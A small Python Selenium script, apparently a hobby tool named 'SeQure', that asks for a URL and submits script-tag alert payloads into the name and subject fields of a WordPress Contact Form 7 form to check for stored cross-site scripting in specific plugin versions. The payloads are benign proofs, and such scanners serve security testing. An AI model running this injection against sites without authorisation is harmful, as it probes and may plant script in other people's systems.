from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
import time
import os

def storedCrossSite(url):
    s = Service("C:/Users/alexi/Desktop/chromedriver/chromedriver")
    driver = webdriver.Chrome(service=s) # path to chromedriver
    driver.get(url)
    # This finds the element and passes in a script
    driver.find_element(By.NAME, 'your-name').send_keys("<Script>alert('Script Passed #name.')</scripT>") # cf7 version 2.0.1; 4.0.1
    driver.find_element(By.NAME, 'your-subject').send_keys("<script>alert('Script Passed #script.')</script>") # cf7 version 2.0.1
    # this finds the button
    #button = driver.find_element(By.ID, 'ninja_forms_field_4')
    button = driver.find_element(By.XPATH,"//input[@class='wpcf7-form-control wpcf7-submit']") # button for version 4.0.1
    time.sleep(10) # sleeps for 5 seconds
    # this clicks the button
    driver.execute_script("arguments[0].click();", button)
    time.sleep(5) # sleeps for 5 seconds
    driver.quit() # closes the window

if __name__ == "__main__":
    clear = lambda: os.system('cls')
    clear() # clear screen
    print("[+] Welcome to SeQure!\n") # starting prompt
    url = input("[+] Enter the URL you would like to check: ")
    print("------------------------------------------------------------------------------------------")
    #driver.get("https://lex.chompe.rs/contact-form-v4-0-1/") # version 4.0.1
    storedCrossSite(url)
